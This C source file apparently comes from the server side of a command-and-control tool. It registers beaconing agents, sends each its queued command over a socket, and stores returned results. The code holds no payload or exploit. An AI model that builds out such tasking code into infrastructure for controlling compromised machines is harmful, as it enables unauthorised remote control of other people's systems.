#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include "../include/utils.h"
#include "../include/session.h"

int handle_beacon(int client_socket, const char *agent_id) {
    pthread_mutex_lock(&agents_mutex);
    int idx = register_agent(agent_id);
    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(client_socket, "NONE", 4, 0);
        return -1;
    }
    if (agents[idx].has_task) {
        send(client_socket, agents[idx].task, strlen(agents[idx].task), 0);
        memset(agents[idx].task, 0, sizeof(agents[idx].task));
        agents[idx].has_task = 0;
        printf("[*] Commande envoyée à l'agent %s\n", agent_id);
    } else {
        send(client_socket, "NONE", 4, 0);
    }
    pthread_mutex_unlock(&agents_mutex);
    return 0;
}

int handle_result(int client_socket, const char *agent_id, const char *result) {
    pthread_mutex_lock(&agents_mutex);
    int idx = find_agent(agent_id);
    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(client_socket, "UNKNOWN", 7, 0);
        return -1;
    }
    strncpy(agents[idx].result, result, sizeof(agents[idx].result) - 1);
    agents[idx].has_result = 1;
    pthread_mutex_unlock(&agents_mutex);
    return 0;
}